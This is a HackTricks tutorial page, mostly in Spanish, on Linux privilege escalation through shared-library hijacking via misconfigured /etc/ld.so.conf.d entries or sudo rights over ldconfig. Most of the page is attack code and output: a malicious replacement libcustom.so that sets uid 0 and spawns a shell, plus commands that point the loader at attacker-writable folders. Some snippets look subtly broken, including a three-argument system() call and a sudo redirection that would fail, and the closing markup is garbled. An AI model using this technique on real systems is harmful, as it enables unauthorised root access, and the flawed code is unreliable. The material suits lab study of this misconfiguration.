# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## Prepare the environment

En la siguiente sección puedes encontrar el código de los archivos que vamos a usar para preparar el entorno

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Crea** esos archivos en tu máquina en la misma carpeta
2. **Compila** la **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` a `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilegios de root)
4. **Compila** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifica el entorno

Verifica que _libcustom.so_ esté siendo **cargada** desde _/usr/lib_ y que puedas **ejecutar** el binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

En este escenario vamos a suponer que **alguien ha creado una entrada vulnerable** dentro de un archivo en _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descargue y compile** el siguiente código dentro de esa ruta:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Ahora que hemos **creado la biblioteca maliciosa libcustom dentro de la ruta mal configurada**, necesitamos esperar a un **reinicio** o a que el usuario root ejecute **`ldconfig`** (_en caso de que puedas ejecutar este binario como **sudo** o tenga el **suid bit**, podrás ejecutarlo tú mismo_).

Una vez que esto haya sucedido, **verifica de nuevo** de dónde está cargando el ejecutable `sharevuln` la biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, **lo está cargando desde `/home/ubuntu/lib`** y si algún usuario lo ejecuta, se ejecutará un shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Nota que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que el usuario root u otro usuario privilegiado ejecute el binario vulnerable** podremos escalar privilegios.
{% endhint %}

### Otras configuraciones incorrectas - Misma vulnerabilidad

En el ejemplo anterior simulamos una configuración incorrecta donde un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración dentro de `/etc/ld.so.conf.d/`**.\
Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad; si tienes **permisos de escritura** en algún **archivo de configuración** dentro de `/etc/ld.so.conf.d`, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf`, puedes configurar la misma vulnerabilidad y explotarla.

## Exploit 2

**Supón que tienes privilegios de sudo sobre `ldconfig`**.\
Puedes indicar a `ldconfig` **dónde cargar los archivos de configuración**, así que podemos aprovechar esto para hacer que `ldconfig` cargue carpetas arbitrarias.\
Así que, vamos a crear los archivos y carpetas necesarios para cargar "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en la **explotación anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos la ruta y verifiquemos de dónde está cargando el binario la biblioteca:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como puedes ver, tener privilegios de sudo sobre `ldconfig` te permite explotar la misma vulnerabilidad.**

{% hint style="info" %}
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
